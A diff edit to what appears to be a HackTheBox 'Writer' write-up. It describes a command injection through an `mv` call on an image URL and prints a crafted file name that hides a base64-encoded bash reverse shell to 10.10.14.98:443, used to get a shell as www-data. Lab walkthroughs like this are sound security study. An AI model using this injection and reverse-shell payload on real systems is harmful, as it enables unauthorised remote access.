@@ -335,7 +335,8 @@ if __name__ == '__main__':
                         cursor.execute("UPDATE stories SET image = %(image)s WHERE id = %(id)s", {'image':image, 'id':id})
                         result = connector.commit()
 ```
-Analyzing `__init__.py` reveals that `mv` command is vulnerable in `image_url` section of `__init__.py` code when image is added to story via url. So we can rename file like `/home/kali/Dropbox/Documents/htb/boxes/writer/clarkey10.jpg;`echo MDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xMC4xMC4xNC45OC80NDM7IGJhc2ggPCYxOTYgPiYxOTYgMj4mMTk2 | base64 -d | bash`
+Analyzing `__init__.py` reveals that `mv` command is vulnerable in `image_url` section of `__init__.py` code when image is added to story via url. So we can rename file like clarkey10.jpg;\`echo MDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xMC4xMC4xNC45OC80NDM7IGJhc2ggPCYxOTYgPiYxOTYgMj4mMTk2 | base64 -d | bash\`, so that when image is uploaded via url , `mv` command is executed along with  base64 encoded reverse shell command in bash to get reverse shell as www-data.
+
 
 
 
